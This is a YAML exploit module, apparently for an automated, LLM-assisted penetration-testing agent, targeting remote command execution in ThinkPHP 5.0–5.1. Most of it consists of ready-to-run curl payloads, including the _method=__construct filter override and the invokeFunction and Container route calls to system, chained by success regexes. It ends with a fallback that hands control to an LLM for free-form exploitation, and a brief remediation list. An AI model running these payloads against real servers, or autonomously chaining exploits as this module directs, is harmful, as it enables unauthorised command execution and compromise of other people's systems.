# ═══════════════════════════════════════════════════════════
# ThinkPHP RCE
#
# 原理: ThinkPHP 5.x 的路由解析允许调用任意类方法
#       通过 _method 参数覆盖请求方法 → 控制 filter 参数 → RCE
# 覆盖: 5.0.0~5.0.23, 5.1.0~5.1.30
# ═══════════════════════════════════════════════════════════
skill_id: thinkphp_rce
name: "ThinkPHP 远程命令执行"
category: web_rce
version: "1.0"

principle: |
  ThinkPHP 5.x 存在多个 RCE 漏洞，核心原理：
  
  1. 方法覆盖 RCE（5.0.x）:
     Request 类的 method() 方法允许通过 _method POST 参数覆盖 HTTP 方法。
     同时 __construct 方法会将 POST 参数覆盖为类属性。攻击者可设置
     filter=system，然后通过 param() 触发 call_user_func → RCE。
  
  2. 路由解析 RCE（5.0.x / 5.1.x）:
     兼容模式路由（s=module/controller/action）允许直接调用任意命名空间
     的类方法，如 think\app/invokeFunction 调用任意函数。
  
  3. 缓存写入 RCE:
     缓存文件名可控时，写入恶意 PHP 代码到缓存文件。
  
  检测特征:
  - 响应头 X-Powered-By: ThinkPHP
  - 页面错误信息包含 ThinkPHP 框架特征
  - /index.php?s=/index/\think\app/invokeFunction 可访问

match:
  rules:
    - fingerprint_contains: ["thinkphp"]
    - fingerprint_contains: ["ThinkPHP"]
    - evidence_contains: ["thinkphp"]
    - evidence_contains: ["think\\app"]

probes:
  - id: confirm_thinkphp
    description: "确认 ThinkPHP 框架及版本"
    steps:
      - command: |
          curl -s -D - {ENDPOINT} --max-time 10
        parse_rules:
          - if_contains: ["ThinkPHP", "thinkphp"]
            set: { thinkphp_confirmed: true }
          - if_contains: ["ThinkPHP V5.0"]
            set: { thinkphp_confirmed: true, tp_version: "5.0" }
          - if_contains: ["ThinkPHP V5.1"]
            set: { thinkphp_confirmed: true, tp_version: "5.1" }
          - if_contains: ["10 yi nian"]
            set: { thinkphp_confirmed: true }

      # 触发错误页面看版本
      - command: |
          curl -s "{ENDPOINT}/index.php?s=/xxx" --max-time 10
        parse_rules:
          - if_contains: ["ThinkPHP", "thinkphp"]
            set: { thinkphp_confirmed: true }
          - if_regex: "ThinkPHP V?(5\\.\\d+\\.\\d+)"
            set: { thinkphp_confirmed: true }

exploit_paths:
  # ═══ 路径 A: _method 方法覆盖 RCE（5.0.x 最经典）═══
  - path_id: method_override
    name: "_method 参数覆盖 RCE"
    priority: 1
    principle: |
      通过 POST _method=__construct 覆盖 Request 属性，
      设置 filter=system，server[REQUEST_METHOD]=命令。
    conditions:
      thinkphp_confirmed: true
    steps:
      - id: method_rce_captcha
        description: "通过 captcha 路由触发 _method RCE"
        command: |
          curl -s -X POST "{ENDPOINT}/index.php?s=captcha" \
            -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id" \
            --max-time 10
        timeout: 15
        success_criteria:
          stdout_regex: "uid=\\d+\\(\\w+\\)"
        on_success: method_whoami
        on_fail: method_rce_index

      - id: method_rce_index
        description: "通过根路由触发 _method RCE"
        command: |
          curl -s -X POST "{ENDPOINT}/index.php" \
            -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id" \
            --max-time 10
        timeout: 15
        success_criteria:
          stdout_regex: "uid=\\d+\\(\\w+\\)"
        on_success: method_whoami
        on_fail: next_path

      - id: method_whoami
        description: "确认用户身份"
        command: |
          curl -s -X POST "{ENDPOINT}/index.php?s=captcha" \
            -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami" \
            --max-time 10
        timeout: 15
        success_criteria:
          stdout_not_empty: true
        on_success: conclude_success
        evidence_capture:
          current_user: stdout
          shell_type: "rce_tp_method_override"

  # ═══ 路径 B: invokeFunction 路由 RCE ═══
  - path_id: invoke_function
    name: "invokeFunction 任意函数调用"
    priority: 2
    principle: |
      兼容模式路由允许直接调用 think\app 的 invokeFunction 方法，
      传入 call_user_func_array 调用 system/exec 等函数。
    conditions:
      thinkphp_confirmed: true
    steps:
      - id: invoke_50
        description: "5.0.x invokeFunction RCE"
        command: |
          curl -s "{ENDPOINT}/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id" \
            --max-time 10
        timeout: 15
        success_criteria:
          stdout_regex: "uid=\\d+\\(\\w+\\)"
        on_success: conclude_success
        on_fail: invoke_51
        evidence_capture:
          shell_type: "rce_tp_invoke_50"

      - id: invoke_51
        description: "5.1.x invokeFunction RCE（路径格式不同）"
        command: |
          curl -s "{ENDPOINT}/index.php?s=index/think\\request/input&filter[]=system&data=id" \
            --max-time 10
        timeout: 15
        success_criteria:
          stdout_regex: "uid=\\d+\\(\\w+\\)"
        on_success: conclude_success
        on_fail: invoke_container
        evidence_capture:
          shell_type: "rce_tp_invoke_51"

      - id: invoke_container
        description: "5.1.x Container RCE"
        command: |
          curl -s "{ENDPOINT}/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id" \
            --max-time 10
        timeout: 15
        success_criteria:
          stdout_regex: "uid=\\d+\\(\\w+\\)"
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_tp_container"

  # ═══ 路径 C: LLM 兜底 ═══
  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      thinkphp_confirmed: true

remediation: |
  1. 升级 ThinkPHP 至 6.x 或最新 5.x 补丁版本
  2. 关闭 debug 模式
  3. 限制路由只匹配预定义的 controller/action
  4. WAF 过滤 _method=__construct、\think\app 等特征
